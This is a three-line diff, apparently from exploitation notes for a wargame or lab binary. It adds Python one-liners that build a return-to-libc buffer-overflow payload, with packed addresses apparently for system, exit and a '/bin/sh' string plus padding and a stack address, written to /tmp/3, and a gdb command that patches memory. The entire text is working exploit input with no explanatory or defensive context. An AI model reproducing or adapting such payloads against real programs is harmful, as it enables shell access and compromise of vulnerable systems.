@@ -1,0 +1,3 @@
+python -c 'import struct; print struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0xb7f8cc58) + "a"*4083 + "\n" + "b"*14 + struct.pack("<I", 0xbffff706) + "c"' > /tmp/3
+python -c 'import struct; print struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0xb7f8cc58) + "a"*4083 + "\n" + "bbbbccccd" + struct.pack("<I", 0xbffff706) + "eee" + "zzzz" + "\n"' > /tmp/3
+set *0xbffff744=0xb7f8cc58
